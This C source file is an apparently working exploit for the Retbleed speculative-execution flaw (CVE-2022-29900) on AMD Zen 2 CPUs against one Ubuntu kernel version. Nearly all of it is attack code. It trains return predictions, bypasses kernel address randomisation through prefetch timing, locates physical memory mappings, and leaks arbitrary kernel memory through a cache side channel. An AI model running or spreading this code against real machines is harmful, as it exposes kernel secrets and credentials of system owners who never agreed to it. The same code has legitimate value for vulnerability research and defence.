/* SPDX-License-Identifier: GPL-3.0-only */
/* Exploit for Retbleed (CVE-2022-29900) targeting AMD Zen 2 machines. */
/* Based on https://github.com/comsec-group/retbleed/tree/master/retbleed_zen/exploits */
#define _GNU_SOURCE

#include <err.h>
#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/user.h>

#include "defs.h"
#include "offsets.h"
#include "retbleed.h"
#include "syscalls.h"


/* Libc functions */
#ifdef RETBLEED_STANDALONE
char *strncpy(char *__restrict dest, const char *__restrict src, size_t len)
{
    size_t str_len;
    for (str_len = 0; str_len < len; str_len++) {
        if (src[str_len] == '\0') {
            break;
        }
    }

    memset(dest, 0, len);
    return memcpy(dest, src, str_len);
}

int strcmp(const char *a, const char *b)
{
    while(*a == *b) {
        if(*a == '\0') {
            return 0;
        }
        ++a;
        ++b;
    }

    return *a - *b;
}
#endif

/* Timing helpers */

/* Load a byte from memory and time how long it takes */
static __always_inline u64 time_load(const u8 *addr)
{
    u64 ret;

    asm volatile(
        // rdtscp waits for earlier instructions to retire before reading the
        // TSC.
        "rdtscp\n\t"
        // timestamp in r8d:ebx
        "mov %%eax, %%ebx\n\t"
        "mov %%edx, %%r8d\n\t"

        // Do the memory access.
        "movb (%%rdi), %%cl\n\t"

        // On AMD/Linux lfence always waits for all previous instructions to
        // retire before executing the next instruction.
        "rdtscp\n\t"
        // timestamp in edx:eax
        "lfence\n\t"

        "shlq $32, %%r8\n\t"
        // timestamp in rbx
        "orq %%r8, %%rbx\n\t"
        "shlq $32, %%rdx\n\t"
        // timestamp in rax
        "orq %%rdx, %%rax\n\t"
        "subq %%rbx, %%rax\n\t"
        : "=a"(ret)
        : "D"(addr)
        : "rbx", "rcx", "rdx", "r8"
    );

    return ret;
}

/* Prefetch a byte from memory and time how long it takes */
static __always_inline u64 time_prefetch(const u8 *addr)
{
    u64 ret;

    asm volatile(
        "mfence\n\t"
        // rdtscp waits for earlier instructions to retire before reading the
        // TSC.
        "rdtscp\n\t"
        // timestamp in r8d:ebx
        "mov %%eax, %%ebx\n\t"
        "mov %%edx, %%r8d\n\t"

        // Do the prefetch
        "lfence\n\t"
        "prefetcht2 (%1)\n\t"
        "lfence\n\t"
        "prefetcht2 (%1)\n\t"

        // On AMD/Linux lfence always waits for all previous instructions to
        // retire before executing the next instruction.
        "rdtscp\n\t"
        // timestamp in edx:eax
        "lfence\n\t"

        "shlq $32, %%r8\n\t"
        // timestamp in rbx
        "orq %%r8, %%rbx\n\t"
        "shlq $32, %%rdx\n\t"
        // timestamp in rax
        "orq %%rdx, %%rax\n\t"
        "subq %%rbx, %%rax\n\t"
        "mfence"
        : "=a"(ret)
        : "D"(addr)
        : "rbx", "rcx", "rdx", "r8"
    );

    return ret;
}

/* Heapsort for u64 arrays. */

static u64 heap_left_child_idx(u64 idx)
{
    return 2 * idx + 1;
}

static u64 heap_parent_idx(u64 idx)
{
    return (idx - 1) / 2;
}

static void u64_swap(u64 *a, u64 *b)
{
    u64 tmp = *a;
    *a = *b;
    *b = tmp;
}

static void heap_bubble_down(u64 *heap, u64 start, u64 size)
{
    u64 node_idx = start;

    // Iterate until the current node still has at least one child.
    while (node_idx * 2 + 1 < size) {
        u64 child_idx = heap_left_child_idx(node_idx);
        // If the root has a right child that is greater than the left child
        // then look at that one.
        if (child_idx + 1 < size && heap[child_idx] < heap[child_idx + 1]) {
            child_idx = child_idx + 1;
        }

        // If the current node is already greater or equal to both children then
        // stop.
        if (heap[node_idx] >= heap[child_idx]) {
            break;
        }

        u64_swap(&heap[node_idx], &heap[child_idx]);
        node_idx = child_idx;
    }
}

/* Sort an array of u64 in ascending order */
static void sort_u64(u64 *data, u64 size)
{
    // Construct a max-heap in the array.
    u64 start = heap_parent_idx(size - 1) + 1;
    while (start > 0) {
        start--;
        heap_bubble_down(data, start, size);
    }

    u64 end = size;
    // The array elements starting at end are sorted, the elements until end are
    // a max-heap.
    while (end > 1) {
        end--;
        // Swap the largest element in the heap with the one at the start of the
        // sorted region.
        u64_swap(&data[end], &data[0]);
        // Restore the max-heap property
        heap_bubble_down(data, 0, end);
    }
}

/* Actual exploit stuff */

// The first 1 MiB is used by firmware and other things like that and the array
// is 2 MiB aligned.
#define PHYSMEM_START (2ul * 1024ul * 1024ul)
// Assume machines with at most 2 TiB of memory.
#define PHYSMEM_END (2ul * 1024ul * 1024ul * 1024ul * 1024ul)
// 2 MiB, because the flush/reload array is 2 MiB-aligned
#define PHYSMEM_STRIDE (2ul * 1024ul * 1024ul)

// __PAGE_OFFSET_BASE_L4
#define PHYSMAP_START 0xffff888000000000ul
// CPU_ENTRY_AREA_BASE.
#define PHYSMAP_END 0xfffffe0000000000ul
// The physmap, vmalloc and vmemmap are always aligned to 1 GiB.
#define PHYSMAP_STRIDE (1ul * 1024ul * 1024ul * 1024ul)

// Pattern to create collisions in the branch predictor.
#define PWN_PATTERN 0xffff800800000000ul
#define PWN_PATTERN2 0xffff802002800000ul

// Number of elements in the Flush/reload array (one for each possible value
// of a byte).
#define FR_COUNT 256
// Address and size of the flush/reload array in userspace. Address and size must both
// be multiples of 2 MiB so that the kernel uses a 2 MiB page.
#define FR_ARRAY_SIZE (2ul * 1024ul * 1024ul)
// Distance between two elements in the flush/reload array. Cache prefetchers
// shouldn't cross (4k) page boundaries.
#define FR_STRIDE 4096ul

// Time (in rdtsc cycles) that differentiates a cache hit from a cache miss.
#define CACHE_THRESHOLD 120

// Number of possible kernel text base addresses.
#define KBASE_NCAND ((KBASE_END - KERNEL_BASE) >> 21)
// Maximum number of 2 MiB pages that make up the kernel image.
#define WINDOW_SIZE_MAX 24
// How many samples to use for the prefetch KASLR bypass.
#define PREFETCH_SAMPLES 100

static void retbleed_error(struct retbleed *self, const char *msg)
{
    strncpy(self->error, msg, sizeof(self->error));
}

/* Free the branch training code */
static void free_training(u8 *target)
{
    u64 training_page_addr_ret1 = (u64)target & ~(PAGE_SIZE - 1);
    _munmap((void *)training_page_addr_ret1, PAGE_SIZE);
}

/* Initialize the retbleed */
int retbleed_init(struct retbleed *self, u64 leak_samples, int kernel_version,
    u64 training_iter, u64 brute_samples)
{
    memset(self, 0, sizeof(*self));

    // Initialize the gadget offsets depending on the target kernel.
    switch (kernel_version) {
    case KERNEL_VERSION_UBUNTU_5_15_0_112_GENERIC:
        memcpy(&self->config, &KERNEL_CONFIG_UBUNTU_15_0_112_GENERIC,
            sizeof(struct kernel_config));
        break;

    default:
        retbleed_error(self, "Unrecognized kernel version");
        goto err_out;
    }

    // Mmap a buffer for the flush/reload samples.
    self->leak_samples = leak_samples;
    self->samples = _mmap(
        NULL, FR_COUNT * self->leak_samples * sizeof(u64),
        PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
    );
    if (self->samples == MAP_FAILED) {
        retbleed_error(self, "mmap samples");
        goto err_out;
    }

    self->training_iter = training_iter;
    self->brute_samples = brute_samples;

    // Mmap the flush/reload array
    self->fr_region = _mmap(
        NULL, 2 * FR_ARRAY_SIZE, PROT_NONE,
        MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
    );
    if (self->fr_region == MAP_FAILED) {
        retbleed_error(self, "mmap F/R region");
        goto err_free_samples;
    }

    // Align to 2 MiB
    u64 fr_array_addr = (u64)self->fr_region;
    if (fr_array_addr % FR_ARRAY_SIZE != 0) {
        fr_array_addr = ((fr_array_addr + FR_ARRAY_SIZE) & ~(FR_ARRAY_SIZE - 1));
    }

    self->fr_array = _mmap(
        (void *)fr_array_addr, FR_ARRAY_SIZE, PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0
    );
    if (self->fr_array == MAP_FAILED) {
        retbleed_error(self, "mmap F/R array");
        goto err_unmap_region;
    }

    if (_madvise((void *)fr_array_addr, FR_ARRAY_SIZE, MADV_HUGEPAGE) < 0) {
        retbleed_error(self, "madvise F/R array");
        goto err_unmap_region;
    }

    // Populate all mappings. This needs to be a store, otherwise all pages will
    // be aliased to the same physical page containing zeroes and cache timing
    // doesn't work.
    for (u64 i = 0; i < FR_COUNT; i++) {
        self->fr_array[FR_STRIDE * i] = i + 1;
    }

    return 0;

err_unmap_region:
    _munmap(self->fr_region, 2 * FR_ARRAY_SIZE);
err_free_samples:
    _munmap(self->samples, self->leak_samples * FR_COUNT * sizeof(u64));
err_out:
    return -1;
}

/* Map and initialize the code that trains one return */
static u8 *retbleed_init_one_training(struct retbleed *self, u64 target,
    u64 ret_offset, u64 pattern)
{
    // Create some code to train the branch predictor.
    // The jump at colliding_addr will collide with the mmap return in the BTB.
    u64 colliding_addr = target ^ pattern;
    u64 training_page_addr = colliding_addr & ~(PAGE_SIZE - 1);

    u8 *training_page = _mmap(
        (void *)training_page_addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0
    );
    if (training_page == MAP_FAILED) {
        retbleed_error(self, "mmap training");
        return NULL;
    }

    u8 *code = (u8 *)colliding_addr;

    memset(training_page, 0xcc, PAGE_SIZE);

    // Fill the basic block with nops.
    memset(code, 0x90, ret_offset);

    // ff e7: jmp rdi
    *(u8 *)(colliding_addr + ret_offset - 1) = 0xff;
    *(u8 *)(colliding_addr + ret_offset) = 0xe7;

    if (_mprotect(training_page, PAGE_SIZE, PROT_READ | PROT_EXEC) < 0) {
        retbleed_error(self, "mprotect training");
        return NULL;
    }

    return code;
}

/* Map and initialize the branch training code */
int retbleed_init_training(struct retbleed *self)
{
    self->x64_sys_mmap_training_code = retbleed_init_one_training(
        self,
        self->kaslr_base + self->config.x64_sys_mmap_offset,
        self->config.x64_sys_mmap_ret_offset,
        PWN_PATTERN
    );
    if (self->x64_sys_mmap_training_code == NULL) {
        return -1;
    }

    self->x64_sys_call_training_code = retbleed_init_one_training(
        self,
        self->kaslr_base + self->config.x64_sys_call_offset,
        self->config.x64_sys_call_ret_offset,
        PWN_PATTERN2
    );
    if (self->x64_sys_call_training_code == NULL) {
        goto free_x64_sys_mmap_training_code;
    }

    self->load_training_code = retbleed_init_one_training(
        self,
        self->kaslr_base + self->config.load_offset,
        self->config.load_ret_offset,
        PWN_PATTERN
    );
    if (self->load_training_code == NULL) {
        goto free_ret_x64_sys_call_training_code;
    }

    self->shift_training_code = retbleed_init_one_training(
        self,
        self->kaslr_base + self->config.shift_offset,
        self->config.shift_ret_offset,
        PWN_PATTERN
    );
    if (self->shift_training_code == NULL) {
        goto free_ret_load_training_code;
    }

    return 0;

free_ret_load_training_code:
    free_training(self->load_training_code);
free_ret_x64_sys_call_training_code:
    free_training(self->x64_sys_call_training_code);
free_x64_sys_mmap_training_code:
    free_training(self->x64_sys_mmap_training_code);
    return -1;
}

/* Release all resources */
void retbleed_finish(struct retbleed *self)
{
    free_training(self->x64_sys_mmap_training_code);
    free_training(self->x64_sys_call_training_code);
    free_training(self->load_training_code);
    free_training(self->shift_training_code);
    _munmap(self->samples, self->leak_samples * FR_COUNT * sizeof(u64));
    _munmap(self->fr_region, 2 * FR_ARRAY_SIZE);
}

/* Flush the probe array from all caches. */
static __always_inline void retbleed_flush(struct retbleed *self)
{
    for (u64 i = 0; i < FR_COUNT; i++) {
        const u8 *target = self->fr_array + i * FR_STRIDE;
        _mm_clflush(target);
    }

    // Wait for all flushes to have completed before moving on.
    _mm_mfence();
}

/*
 * Load from each cache line in the probe array once and time how long each
 * load takes.
 */
static __always_inline void retbleed_reload(struct retbleed *self, u64 sample)
{
    // Wait for all previous loads and stores to complete before touching the
    // reload array.
    _mm_mfence();

    for (u64 i = 0; i < FR_COUNT; i++) {
        // Z/256Z is a cyclic group, and any odd number between 0 and 256 is
        // a generator, so repeatedly adding it to itself will generate every
        // number in the group. This hopefully prevents the prefetcher from
        // interfering with the reload timing.
        u64 ii = (i * 73 + 100) % FR_COUNT;

        const u8 *target = self->fr_array + ii * FR_STRIDE;
        self->samples[sample + ii * self->leak_samples] = time_load(target);
    }
}

/*
 * Train the branch predictor to speculatively execute target in the kernel
 * when returning from the target function. The arguments are actually used
 * and this is just there to silence GCC warnings. This uses a retpoline to
 * make sure that the training code is only executed speculatively, to avoid
 * a #PF and subsequent SIGSEGV and context switch. Training in speculation
 * suppresses the exception but still inserts an entry in the BTB.
 */
static __attribute__((naked, noinline)) void train_ret(__attribute__((unused)) u64 target, __attribute__((unused)) u8 *training_code)
{
    asm volatile(
        // Prefetch training code
        "prefetcht0 (%%rsi)\n\t"

        // Flush the stack to widen the speculation window.
        "clflush -8(%%rsp)\n\t"
        "mfence\n\t"

        "call 1f\n\t"
        // Executed only speculatively
        "jmp *%%rsi\n\t"
        "lfence\n\t"

        "1:\n\t"
        // For some reason, compiler emits a different instruction that crashes,
        // so hardcode bytes here.
        // add 0x8, %%rsp
        ".byte 0x48, 0x83, 0xc4, 0x08\n\t"
        "retq\n\t"
        ::: "memory"
    );
}

/* Execute a gadget speculatively in the kernel with controlled rdi and rsi. */
static void do_speculation_mmap(u64 rdi, u64 rsi, u64 rdx, u64 rcx, u64 r8)
{
    syscall6(
        SYS_mmap,
        rdi,
        rsi,
        rdx,
        rcx,
        r8,
        1 /* r9 */
    );
}

/*
 * Execute a gadget that speculatively brings the memory at physical address pa
 * into the cache.
 */
static __always_inline void retbleed_speculate_physaddr_gadget(u64 pa)
{
    // add rsi, page_offset_base
    // add rsi, rcx
    // mov rdi, [rsi]
    do_speculation_mmap(0, pa, 0, 0, 0);
}

/*
 * Execute a gadget that speculatively brings the memory at virtual address addr
 * into the cache.
 */
static __always_inline void retbleed_speculate_physmap_gadget(u64 addr)
{
    do_speculation_mmap(0, addr, 0, 0, 0);
}

/* Access the probe array speculatively. */
static __always_inline void retbleed_speculate_leak_gadget(u64 secret_kva,
    u64 probe_array_kva)
{
    // movzx   eax, byte ptr [rdi + 0x22e]
    // shl     rax, 0xc
    // mov     rax, [rsi+rax+0x60]
    do_speculation_mmap(secret_kva - 0x22e, probe_array_kva - 0x60, 0, 0, 0);
}

/*
 * Find the base address of the kernel image in memory by using prefetch. The
 * prefetch instruction executes faster when prefetching a valid kernel address.
 */
u64 retbleed_break_text_kaslr(struct retbleed *self)
{
    u64 ret = -1;

    u64 means[KBASE_NCAND + WINDOW_SIZE_MAX] = {0};

    const u64 samples_size = (KBASE_NCAND + WINDOW_SIZE_MAX) * PREFETCH_SAMPLES * sizeof(u64);
    u64 *samples = _mmap(
        NULL, samples_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE,
        -1, 0
    );
    if (samples == MAP_FAILED) {
        return ret;
    }

    // Prefetch all possible base addresses of the kernel and time how long each
    // prefetch takes.
    for (u64 i = 0; i < PREFETCH_SAMPLES; i++) {
        for (u64 ii = 0; ii < KBASE_NCAND + WINDOW_SIZE_MAX; ii++) {
            _sched_yield();

            u64 kaslr_guess = KERNEL_BASE + (ii << 21);
            do_speculation_mmap(0, 0, 0, 0, 0);
            u64 time = time_prefetch((u8 *)(kaslr_guess));

            samples[i + ii * PREFETCH_SAMPLES] = time;
        }
    }

    // Sort the prefetch samples and compute the mean of the fastest 50%
    for (u64 i = 0; i < KBASE_NCAND + WINDOW_SIZE_MAX; i++) {
        sort_u64(&samples[i * PREFETCH_SAMPLES], PREFETCH_SAMPLES);
        for (u64 ii = 0; ii < PREFETCH_SAMPLES / 10; ii++) {
            means[i] += samples[i * PREFETCH_SAMPLES + ii];
        }
        means[i] /= (PREFETCH_SAMPLES / 2);
    }

    // Find which KASLR guess produced the fastest time (i.e. it was in the TLB).
    u64 fastest = UINT64_MAX;
    for(u64 i = 0; i < KBASE_NCAND; i++) {
        u64 kaslr_guess = KERNEL_BASE + (i << 21);

        u64 window_sum = 0;
        for (u64 ii = 0; ii < self->config.prefetch_window_size; ii++) {
            window_sum += means[i + ii];
        }

        if (window_sum < fastest) {
            fastest = window_sum;
            ret = kaslr_guess;
        }
    }

    _munmap(samples, samples_size);

    self->kaslr_base = ret;
    return ret;
}

/* Leak one byte from the kernel at the specified address. */
static bool retbleed_leak_one(struct retbleed *self, u64 address, u8 *result)
{
    u64 max = 0;
    u64 max_idx = 0;
    u64 counters[FR_COUNT] = {};

    for (u64 i = 0; i < self->leak_samples; i++) {
        retbleed_flush(self);
        _sched_yield();

        // Critical section start
        for (u64 ii = 0; ii < self->training_iter; ii++) {
            train_ret(
                self->kaslr_base + self->config.load_offset,
                self->x64_sys_mmap_training_code
            );
            train_ret(
                self->kaslr_base + self->config.load_offset,
                self->x64_sys_call_training_code
            );
            train_ret(
                self->kaslr_base + self->config.shift_offset,
                self->load_training_code
            );
            train_ret(
                self->kaslr_base + self->config.leak_gadget_offset,
                self->shift_training_code
            );

            retbleed_speculate_leak_gadget(address, self->fr_array_pa + self->physmap_base);
        }

        retbleed_reload(self, i);
    }

    for (u64 i = 0; i < FR_COUNT; i++) {
        // Look at the smallest sample for each value
        for (u64 ii = 0; ii < self->leak_samples; ii++) {
            u64 current = self->samples[self->leak_samples * i + ii];
            if (current < CACHE_THRESHOLD) {
                counters[i]++;
            }
        }
    }

    for (u64 i = 0; i < FR_COUNT; i++) {
        u64 current = counters[i];
        if (current > max) {
            max = current;
            max_idx = i;
        }
    }

    *result = max_idx;
    return max > 0;
}

/* Check if the physical address of the F/R array is equal to guess. */
static bool retbleed_try_one_pa(struct retbleed *self, u64 guess)
{
    u8 *fr_addr = (u8 *)self->fr_array;

    for (u64 i = 0; i < self->brute_samples; i++) {
        _mm_clflush(fr_addr);

        // Wait for the lines to be gone from the cache.
        _mm_mfence();

        _sched_yield();
        for (u64 ii = 0; ii < self->training_iter; ii++) {
            train_ret(
                self->kaslr_base + self->config.physaddr_gadget_offset,
                self->x64_sys_mmap_training_code
            );
            train_ret(
                self->kaslr_base + self->config.physaddr_gadget_offset,
                self->x64_sys_call_training_code
            );
            retbleed_speculate_physaddr_gadget(guess);
        }

        // Wait for all the speculative accesses to reach the cache.
        _mm_mfence();
        u64 time = time_load(fr_addr);
        if (time < CACHE_THRESHOLD) {
            return true;
        }
    }

    return false;
}

// Check if the base address of the physmap is guess.
static bool retbleed_try_one_physmap(struct retbleed *self, u64 guess, u64 offset)
{
    u8 *fr_addr = (u8 *)self->fr_array + offset;

    u64 sample_count = 4 * self->brute_samples;
    for (u64 i = 0; i < sample_count; i++) {
        _mm_clflush(fr_addr);

        // Wait for the lines to be gone from the cache.
        _mm_mfence();

        _sched_yield();
        for (u64 ii = 0; ii < self->training_iter; ii++) {
            train_ret(
                self->kaslr_base + self->config.physmap_gadget_offset,
                self->x64_sys_mmap_training_code
            );
            train_ret(
                self->kaslr_base + self->config.physmap_gadget_offset,
                self->x64_sys_call_training_code
            );
            retbleed_speculate_physmap_gadget(self->fr_array_pa + guess + offset);
        }

        // Wait for all the speculative accesses to reach the cache.
        _mm_mfence();
        if (time_load(fr_addr) < CACHE_THRESHOLD) {
            return true;
        }
    }

    return false;
}

// Get the physical address of the flush/reload array.
u64 retbleed_find_fr_pa(struct retbleed *self)
{
    // Try to access the first byte of the f/r array in the physmap, then figure
    // out if it's in the cache by looking at timing. If we guessed the physical
    // address correctly then it will be in the cache.
    for (u64 guess = PHYSMEM_START; guess < PHYSMEM_END; guess += PHYSMEM_STRIDE) {
        if (retbleed_try_one_pa(self, guess)) {
            self->fr_array_pa = guess;
            return guess;
        }
    }

    retbleed_error(self, "Didn't find reload array :(");
    return -1;
}

// Get the base address of the physmap.
u64 retbleed_break_physmap_kaslr(struct retbleed *self)
{
    // Same as above but this time with the physmap base.
    for (u64 guess = PHYSMAP_START; guess < PHYSMAP_END; guess += PHYSMAP_STRIDE) {
        if (retbleed_try_one_physmap(self, guess, 0)) {
            self->physmap_base = guess;
            return guess;
        }
    }

    retbleed_error(self, "Didn't find physmap :(");
    return -1;
}

// Leak size bytes of kernel memory from the specified address. The leaked data
// is written into result.
#define LEAK_RETRIES 100
u64 retbleed_leak_kernel_memory(struct retbleed *self, u64 address, u64 size,
    u8 *result)
{
    for (u64 i = 0; i < size; i++) {
        u64 ii;
        for (ii = 0; ii < LEAK_RETRIES; ii++) {
            if (retbleed_leak_one(self, address + i, &result[i])) {
                break;
            }
        }

        if (ii == LEAK_RETRIES) {
            return i;
        }
    }

    return size;
}

#ifdef RETBLEED_STANDALONE
u64 __attribute__ ((section (".start.text"))) start(struct retbleed *retbleed, int cmd, u64 arg1, u64 arg2, u64 arg3, u64 arg4)
{
    u64 ret = -1;

    switch (cmd) {
    case RETBLEED_CMD_INIT:
        // Initialize everything
        // arg1 = number of samples for leaking with f/r.
        // arg2 = target kernel version
        // arg3 = training iterations
        // arg4 = number of samples for bruteforcing physmap/PA
        ret = retbleed_init(retbleed, arg1, arg2, arg3, arg4);
        break;

    case RETBLEED_CMD_BREAK_TEXT_KASLR:
        // Find the kernel image in memory.
        ret = retbleed_break_text_kaslr(retbleed);
        break;

    case RETBLEED_CMD_FIND_FR_BUFFER_PA:
        // Find the FR buffer in memory.
        ret = retbleed_init_training(retbleed);
        if (ret == UINT64_MAX) {
            goto out;
        }
        ret = retbleed_find_fr_pa(retbleed);
        break;

    case RETBLEED_CMD_BREAK_PHYSMAP_KASLR:
        // Find the physmap in memory.
        ret = retbleed_break_physmap_kaslr(retbleed);
        break;

    case RETBLEED_CMD_LEAK_MEMORY:
        // Leak some kernel memory.
        // arg1: kernel address of the memory to leak.
        // arg2: how many bytes to leak.
        // arg3: pointer to the result buffer.
        ret = retbleed_leak_kernel_memory(retbleed, arg1, arg2, (u8 *)arg3);
        break;

    case RETBLEED_CMD_FINISH:
        // Cleanup
        retbleed_finish(retbleed);
        ret = 0;
        break;

    default:
        break;
    }

out:
    return ret;
}

#endif /* RETBLEED_STANDALONE */
